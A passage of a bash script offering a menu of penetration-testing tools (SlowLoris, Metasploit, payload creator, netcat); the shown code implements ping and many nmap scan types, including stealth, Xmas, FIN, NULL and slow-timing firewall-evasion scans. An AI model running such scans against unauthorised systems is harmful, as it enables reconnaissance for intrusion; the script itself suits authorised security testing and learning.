#!/bin/bash
# scanning-script: info gathering tools
# Written by Vlad Stanoiu

clear;
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color
BLUE='\033[0;34m'
GRAY='\033[0;37m'
WHITE='\033[1;37m'
ORANGE='\033[0;33m'
BWhite='\033[3;97m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
LRED='\033[2;91m'

while : ;

    do
    printf "\n"
    echo -e "${NC}-------------------------------------------${NC}"
    printf "|${GREEN}                                         |";printf "\n"
    echo -e "|${BWhite}            Let's HUNT                 ${NC}  |"
    printf "|                                         |"
    printf "\n${GREEN}---------------------${NC}"
    echo -e "${NC}----------------------"
    echo -e "|${CYAN} 1.  Ping ${BLUE}<hostname>${NC}                     |"
    echo -e "|${CYAN} 2.  NMAP${NC}                                |"
    echo -e "|${CYAN} 3.  FUZZING        ${NC}                     |"
    echo -e "|${CYAN} 4.  SSL Test${NC}                            |"
    echo -e "|${CYAN} 5.  Active Directory ${NC}                   |"
    echo -e "|${CYAN} 6.  Web Server Testing     ${NC}             |"
    echo -e "|${CYAN} 7.  SlowLoris         ${NC}                  |"
    echo -e "|${CYAN} 8.  Hping3${NC}                              |"
    echo -e "|${CYAN} 9.  NsLookup       ${NC}                     |"
    echo -e "|${CYAN} 10. Dig       ${NC}                          |"
    echo -e "|${CYAN} 11. Whois             ${NC}                  |"
    echo -e "|${CYAN} 12. MetaSploit             ${NC}             |"
    echo -e "|${CYAN} 13. Payload Creator ${NC}                    |"
    echo -e "|${CYAN} 14. SearchSploit    ${NC}                    |"
    echo -e "|${CYAN} 15. Enum4linux       ${NC}                   |"
    echo -e "|${CYAN} 16. WordPress       ${NC}                    |"
    printf '%s\n' -------------------------------------------
    echo -e "| 17. Maintenance       ${NC}                  |"
    echo -e "| 18. Passwords         ${NC}                  |"
    echo -e "| 19. WiFi              ${NC}                  |"
    echo -e "| 20. Netcat            ${NC}                  |"
    echo -e "| 21. Servers         ${NC}                    |"
    printf '%s\n' -------------------------------------------
    echo -e "|${ORANGE} 22. Enter IP Address & Port${NC}             |"
    echo -e "|${ORANGE} 23. Show  IP & Port    ${NC}                 |" 
    echo -e "|${ORANGE} 24. Clear IP & Port    ${NC}                 |"
    printf '%s\n' -------------------------------------------
    echo -e "|${PURPLE} 25. Create A Customer Profile        ${NC}   |"
    echo -e "|${PURPLE} 26. Show Profile                     ${NC}   |"
    echo -e "|${PURPLE} 27. Delete Profile                   ${NC}   |"
    printf '%s\n' -------------------------------------------
    echo -e "|${GRAY} 28. Guide and Installation Tools     ${NC}   |"
    printf '%s\n' -------------------------------------------
    echo -e "|${YELLOW} 0.  Quit${NC}                                |"
    echo -e "-------------------------------------------"
    echo -n -e "${RED}Enter Selection [0-28]: ${WHITE}";
    read -e  -r input
    printf "\n";clear;
        case $input in
            1)
                if [[ $IP == "" ]]
                    then
                        echo "Enter a IP address:"
                        printf "${CYAN}";read -e  IP;printf "${WHITE}"
                        echo "Enter The Number Of Ping Requests:";
                        printf "${CYAN}";read -e  d;
                        sudo ping -c$d $IP; printf "\n"${NC};
                        unset IP;clear;printf "${WHITE}";printf "\nPING Executed - IP Cleared\n";printf "${NC}"
                    else
                        echo "Enter The Number Of Ping Requests:";
                        printf "${CYAN}";read -e  c;
                        sudo ping -c$c $IP; printf "\n"${NC};
                        clear
                        printf "${WHITE}";printf "\nIP: $IP\n";printf "${NC}"
                        unset IP;clear;printf "${WHITE}";printf "\nPING Executed - IP Cleared\n";printf "${NC}"
   
                    fi;;

#nmap
            2)
                while : ; do

                    printf "${WHITE}Select A Tool:${NC}\n\n"
                    echo -e "${CYAN}1. Basic Scan ${NC}"
                    echo -e "${CYAN}2. Stealthy Scan${NC}"
                    echo -e "${CYAN}3. Xmass Scan ${NC}"
                    echo -e "${CYAN}4. Aggressive Scan ${NC}"
                    echo -e "${CYAN}5. FIN Scan ${NC}"
                    echo -e "${CYAN}6. NULL Scan ${NC}"              
                    echo -e "${CYAN}7. Version Detection ${NC}"
                    echo -e "${CYAN}8. OS Detection${NC}"
                    echo -e "${CYAN}9. Connect Scan${NC}"
                    echo -e "${CYAN}10. UDP Scan${NC}"
                    echo -e "${CYAN}11. Firewall Detection ${NC}"
                    echo -e "${CYAN}12. Firewall Evasion ${NC}"
                    echo -e "${CYAN}13. Filtered Port Scan ${NC}"
                    echo -e "${CYAN}14. Discover New Port ${NC}"
                    echo -e "${CYAN}15. Sub-Domain Brute-force ${NC}"
                    echo -e "${CYAN}16. Script Scan ${NC}"
                    echo -e "${CYAN}17. Customized Scan${NC}"
                    echo -e "${CYAN}18. SCADA Default Ports ${NC}"
                    echo -e "${GREEN}19. Search Script ${NC}"
                    echo -e "${GREEN}20. Show Values ${NC}"
                    echo -e "${GREEN}21. Set Values${NC}"
                    echo -e "${GREEN}22. Clear Values ${NC}"
                    echo -e "${YELLOW}0. Back ${NC}\n"
                    echo -n -e "${RED}Enter selection [0-22]: ${NC}"
                    printf ${WHITE};
                    read -e  -r nmappp;
                    printf "\n";clear;                  

                        case $nmappp in 

                            1) 
                                while [[ $IP == "" ]]
                                do
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                done

                                printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                read -e FILENAME;
                                if [[ $FILENAME != "" ]]; then
                                    OUTPUT_FLAG="-oN";
                                    OUTPUT_FILE="/home/$USER/$FOLDER/$FILENAME";
                                else
                                    OUTPUT_FLAG="";
                                    OUTPUT_FILE="";
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n";
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG ${CYAN}$IP${YELLOW} $OUTPUT_FLAG ${CYAN}$OUTPUT_FILE${YELLOW} \n\n";
                                echo -e "${NC}-------------------------------------------${NC}";

                                sudo nmap $FLAG $IP $OUTPUT_FLAG $OUTPUT_FILE;
                                printf "\n";
                                unset FILENAME;;

                            2) 

                                while [[ $IP == "" ]]
                                do
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                done

                                printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                                read -e PORT;
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                read -e FILENAME;

                                if [[ $PORT != "" ]]; then
                                    PORT_OPTION="-p $PORT";
                                else
                                    PORT_OPTION="-p-";
                                fi

                                if [[ $FILENAME != "" ]]; then
                                    OUTPUT_FLAG="-oN";
                                    OUTPUT_FILE="/home/$USER/$FOLDER/$FILENAME";
                                else
                                    OUTPUT_FLAG="";
                                    OUTPUT_FILE="";
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n";
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                printf "${WHITE}Executing command: ${YELLOW}nmap -sS -Pn $FLAG $PORT_OPTION ${CYAN}$IP${YELLOW} $OUTPUT_FLAG ${CYAN}$OUTPUT_FILE${YELLOW}\n\n";
                                echo -e "${NC}-------------------------------------------${NC}";

                                sudo nmap -sS -Pn $FLAG $PORT_OPTION $IP $OUTPUT_FLAG $OUTPUT_FILE -v;
                                printf "\n";
                                unset FILENAME;;


                            3)
                                while [[ $IP == "" ]]
                                do      
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"

                                    printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                                    read -e PORT;
                                    printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"

                                    printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                    read -e FILENAME;
                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"

                                    printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                    read -e FLAG;
                                    printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"                                    
                                    echo -e "${NC}-------------------------------------------${NC}\n"        
                                done

                                if [[ $PORT != "" ]]
                                then    
                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                    if [[ $FILENAME != "" ]]
                                    then
                                        printf "${WHITE}Executing command: ${YELLOW}nmap -sX $FLAG -p $PORT${YELLOW} ${CYAN}$IP${YELLOW} -oN ${CYAN}$FILENAME${YELLOW} -v\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}"
                                        sudo nmap -sX $FLAG -p$PORT $IP -oN /home/$USER/$FOLDER/$FILENAME -v;printf "\n";unset FILENAME;unset TIMING;
                                    else
                                        printf "${WHITE}Executing command: ${YELLOW}nmap -sX $FLAG -p- ${CYAN}$IP${YELLOW}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}"
                                        sudo nmap -sX $FLAG -p- $IP -v ;printf "\n";unset FILENAME;unset TIMING;
                                    fi
                                else
                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                    if [[ $FILENAME != "" ]]
                                    then
                                        printf "${WHITE}Executing command: ${YELLOW}nmap -sX $FLAG -p- ${CYAN}$IP${YELLOW} -oN ${CYAN}$FILENAME${YELLOW} -v\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}"
                                        sudo nmap -sX $FLAG -p- $IP -oN /home/$USER/$FOLDER/$FILENAME -v ;printf "\n";unset FILENAME;unset TIMING;
                                    else
                                        printf "${WHITE}Executing command: ${YELLOW}nmap -sX $FLAG -p- ${CYAN}$IP${YELLOW} -v\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}"
                                        sudo nmap -sX $FLAG -p- $IP -v ;printf "\n";unset FILENAME;unset TIMING;
                                    fi
                                fi;;

                                

                            4)

                                while [[ -z "$IP" ]]
                                do
                                    printf "${WHITE}Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n${NC}"
                                    read -e IP
                                done
                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"

                                printf "${WHITE}Insert Port (${YELLOW}ex: 80,443${WHITE}):\n${NC}"
                                read -e PORT
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"

                                printf "${WHITE}Insert FLAG:\n${NC}"
                                read -e FLAG
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"

                                printf "${WHITE}Insert File Name (press Enter for no file):\n${NC}"
                                read -e FILENAME
                                if [[ -n "$FILENAME" ]]; then
                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n"

                                if [[ -n "$PORT" ]]; then
                                    clear
                                    printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                    printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                    printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG --min-rate 500 -T4 -sC -sV -O -p $PORT${YELLOW} ${CYAN}$IP${YELLOW}${FILENAME:+ -oN /home/$USER/$FOLDER/$FILENAME} -v\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}"
                                    sudo nmap $FLAG --min-rate 500 -T4 -sC -sV -O -p$PORT $IP ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME} -v
                                    printf "\n"
                                else
                                    clear
                                    printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                    printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG --min-rate 500 -T4 -sC -sV -O -p- ${CYAN}$IP${YELLOW}${FILENAME:+ -oN /home/$USER/$FOLDER/$FILENAME}\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}"
                                    sudo nmap $FLAG --min-rate 500 -T4 -sC -sV -O -p- $IP ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME} -v
                                    printf "\n"
                                fi;;


                            5)
                                while [[ $IP == "" ]]
                                do
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                done

                                printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                                read -e PORT;
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                read -e FILENAME;

                                if [[ $PORT != "" ]]; then
                                    PORT_OPTION="-p $PORT";
                                else
                                    PORT_OPTION="-p-";
                                fi

                                if [[ $FILENAME != "" ]]; then
                                    OUTPUT_FLAG="-oN";
                                    OUTPUT_FILE="/home/$USER/$FOLDER/$FILENAME";
                                else
                                    OUTPUT_FLAG="";
                                    OUTPUT_FILE="";
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n";
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                printf "${WHITE}Executing command: ${YELLOW}nmap -sF $FLAG $PORT_OPTION ${CYAN}$IP${YELLOW} $OUTPUT_FLAG ${CYAN}$OUTPUT_FILE${YELLOW}\n\n";
                                echo -e "${NC}-------------------------------------------${NC}";

                                sudo nmap -sF $FLAG $PORT_OPTION $IP $OUTPUT_FLAG $OUTPUT_FILE -v;
                                printf "\n";
                                unset FILENAME;;

                            6)
                                while [[ $IP == "" ]]
                                do
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                done

                                printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                                read -e PORT;
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                read -e FILENAME;

                                if [[ $PORT != "" ]]; then
                                    PORT_OPTION="-p $PORT";
                                else
                                    PORT_OPTION="-p-";
                                fi

                                if [[ $FILENAME != "" ]]; then
                                    OUTPUT_FLAG="-oN";
                                    OUTPUT_FILE="/home/$USER/$FOLDER/$FILENAME";
                                else
                                    OUTPUT_FLAG="";
                                    OUTPUT_FILE="";
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n";
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                printf "${WHITE}Executing command: ${YELLOW}nmap -sN $FLAG $PORT_OPTION ${CYAN}$IP${YELLOW} $OUTPUT_FLAG ${CYAN}$OUTPUT_FILE${YELLOW}\n\n";
                                echo -e "${NC}-------------------------------------------${NC}";

                                sudo nmap -sN $FLAG $PORT_OPTION $IP $OUTPUT_FLAG $OUTPUT_FILE -v;
                                printf "\n";
                                unset FILENAME;;

                            7)
                                while [[ $IP == "" ]]
                                do
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                done

                                printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                                read -e PORT;
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                read -e FILENAME;

                                if [[ $PORT != "" ]]; then
                                    PORT_OPTION="-p $PORT";
                                else
                                    PORT_OPTION="-p-";
                                fi

                                if [[ $FILENAME != "" ]]; then
                                    OUTPUT_FLAG="-oN";
                                    OUTPUT_FILE="/home/$USER/$FOLDER/$FILENAME";
                                else
                                    OUTPUT_FLAG="";
                                    OUTPUT_FILE="";
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n";
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                printf "${WHITE}Executing command: ${YELLOW}nmap -sV $FLAG $PORT_OPTION ${CYAN}$IP${YELLOW} $OUTPUT_FLAG ${CYAN}$OUTPUT_FILE${YELLOW}\n\n";
                                echo -e "${NC}-------------------------------------------${NC}";

                                sudo nmap -sV $FLAG $PORT_OPTION $IP $OUTPUT_FLAG $OUTPUT_FILE -v;
                                printf "\n";
                                unset FILENAME;;


                            8)
                                while [[ $IP == "" ]]
                                do
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                done

                                printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                                read -e PORT;
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                read -e FILENAME;

                                if [[ $PORT != "" ]]; then
                                    PORT_OPTION="-p $PORT";
                                else
                                    PORT_OPTION="-p-";
                                fi

                                if [[ $FILENAME != "" ]]; then
                                    OUTPUT_FLAG="-oN";
                                    OUTPUT_FILE="/home/$USER/$FOLDER/$FILENAME";
                                else
                                    OUTPUT_FLAG="";
                                    OUTPUT_FILE="";
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n";
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                printf "${WHITE}Executing command: ${YELLOW}nmap -O $FLAG $PORT_OPTION ${CYAN}$IP${YELLOW} $OUTPUT_FLAG ${CYAN}$OUTPUT_FILE${YELLOW}\n\n";
                                echo -e "${NC}-------------------------------------------${NC}";

                                sudo nmap -O $FLAG $PORT_OPTION $IP $OUTPUT_FLAG $OUTPUT_FILE -v;
                                printf "\n";
                                unset FILENAME;;


                            9)
                                while [[ $IP == "" ]]
                                do
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                done

                                printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                                read -e PORT;
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                read -e FILENAME;

                                if [[ $PORT != "" ]]; then
                                    PORT_OPTION="-p $PORT";
                                else
                                    PORT_OPTION="-p-";
                                fi

                                if [[ $FILENAME != "" ]]; then
                                    OUTPUT_FLAG="-oN";
                                    OUTPUT_FILE="/home/$USER/$FOLDER/$FILENAME";
                                else
                                    OUTPUT_FLAG="";
                                    OUTPUT_FILE="";
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n";
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                printf "${WHITE}Executing command: ${YELLOW}nmap -sT $FLAG $PORT_OPTION ${CYAN}$IP${YELLOW} $OUTPUT_FLAG ${CYAN}$OUTPUT_FILE${YELLOW}\n\n";
                                echo -e "${NC}-------------------------------------------${NC}";

                                sudo nmap -sT $FLAG $PORT_OPTION $IP $OUTPUT_FLAG $OUTPUT_FILE -v;
                                printf "\n";
                                unset FILENAME;;

                            10)
                                while [[ $IP == "" ]]
                                do
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                done

                                printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                                read -e PORT;
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                read -e FILENAME;

                                if [[ $PORT != "" ]]; then
                                    PORT_OPTION="-p $PORT";
                                else
                                    PORT_OPTION="-p-";
                                fi

                                if [[ $FILENAME != "" ]]; then
                                    OUTPUT_FLAG="-oN";
                                    OUTPUT_FILE="/home/$USER/$FOLDER/$FILENAME";
                                else
                                    OUTPUT_FLAG="";
                                    OUTPUT_FILE="";
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n";
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                printf "${WHITE}Executing command: ${YELLOW}nmap -sUV --version-intensity 0 $FLAG $PORT_OPTION ${CYAN}$IP${YELLOW} $OUTPUT_FLAG ${CYAN}$OUTPUT_FILE${YELLOW}\n\n";
                                echo -e "${NC}-------------------------------------------${NC}";

                                sudo nmap -sUV --version-intensity 0 $FLAG $PORT_OPTION $IP $OUTPUT_FLAG $OUTPUT_FILE -v;
                                printf "\n";
                                unset FILENAME;;

                            11)
                                while [[ $IP == "" ]]
                                do
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                done

                                printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                                read -e PORT;
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                read -e FILENAME;

                                if [[ $PORT != "" ]]; then
                                    PORT_OPTION="-p $PORT";
                                else
                                    PORT_OPTION="-p-";
                                fi

                                if [[ $FILENAME != "" ]]; then
                                    OUTPUT_FLAG="-oN";
                                    OUTPUT_FILE="/home/$USER/$FOLDER/$FILENAME";
                                else
                                    OUTPUT_FLAG="";
                                    OUTPUT_FILE="";
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n";
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                printf "${WHITE}Executing command: ${YELLOW}nmap -sA $FLAG $PORT_OPTION ${CYAN}$IP${YELLOW} $OUTPUT_FLAG ${CYAN}$OUTPUT_FILE${YELLOW}\n\n";
                                echo -e "${NC}-------------------------------------------${NC}";

                                sudo nmap -sA $FLAG $PORT_OPTION $IP $OUTPUT_FLAG $OUTPUT_FILE -v;
                                printf "\n";
                                unset FILENAME;;


                            12)
                                while [[ $IP == "" ]]
                                do
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                done

                                printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                                read -e PORT;
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                read -e FILENAME;

                                if [[ $PORT != "" ]]; then
                                    PORT_OPTION="-p $PORT";
                                else
                                    PORT_OPTION="-p-";
                                fi

                                if [[ $FILENAME != "" ]]; then
                                    OUTPUT_FLAG="-oN";
                                    OUTPUT_FILE="/home/$USER/$FOLDER/$FILENAME";
                                else
                                    OUTPUT_FLAG="";
                                    OUTPUT_FILE="";
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n";
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                printf "${WHITE}Executing command: ${YELLOW}nmap -sF -T1 $FLAG $PORT_OPTION ${CYAN}$IP${YELLOW} $OUTPUT_FLAG ${CYAN}$OUTPUT_FILE${YELLOW}\n\n";
                                echo -e "${NC}-------------------------------------------${NC}";

                                sudo nmap -sF -T1 $FLAG $PORT_OPTION $IP $OUTPUT_FLAG $OUTPUT_FILE -v;
                                printf "\n";
                                unset FILENAME;;


                            13)

                                while [[ $IP == "" ]]
                                do
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                done

                                printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                                read -e PORT;
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                read -e FILENAME;

                                if [[ $PORT != "" ]]; then
                                    PORT_OPTION="-p $PORT";
                                else
                                    PORT_OPTION="-p-";
                                fi

                                if [[ $FILENAME != "" ]]; then
                                    OUTPUT_FLAG="-oN";
                                    OUTPUT_FILE="/home/$USER/$FOLDER/$FILENAME";
                                else
                                    OUTPUT_FLAG="";
                                    OUTPUT_FILE="";
                                fi

                                echo -e "${NC}-------------------------------------------${NC}\n";
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                printf "${WHITE}Executing command: ${YELLOW}nmap -sS -Pn -n --disable-arp-ping --packet-trace $FLAG $PORT_OPTION ${CYAN}$IP${YELLOW} $OUTPUT_FLAG ${CYAN}$OUTPUT_FILE${YELLOW}\n\n";
                                echo -e "${NC}-------------------------------------------${NC}";

                                sudo nmap -sS -Pn -n --disable-arp-ping --packet-trace $FLAG $PORT_OPTION $IP $OUTPUT_FLAG $OUTPUT_FILE -v;
                                printf "\n";
                                unset FILENAME;;


                            14)

                                while [[ $IP == "" ]]
                                do
                                    printf "${WHITE}"; printf "Insert Target IP Address (${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n"; printf "${NC}";
                                    read -e IP;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                done

                                printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 80,443${WHITE}):\n"; printf "${NC}";
                                read -e PORT;
                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}";
                                read -e FLAG;
                                printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n";

                                printf "${WHITE}"; printf "Insert File Name (leave blank for no output file):\n"; printf "${NC}";
                                read -e FILENAME;

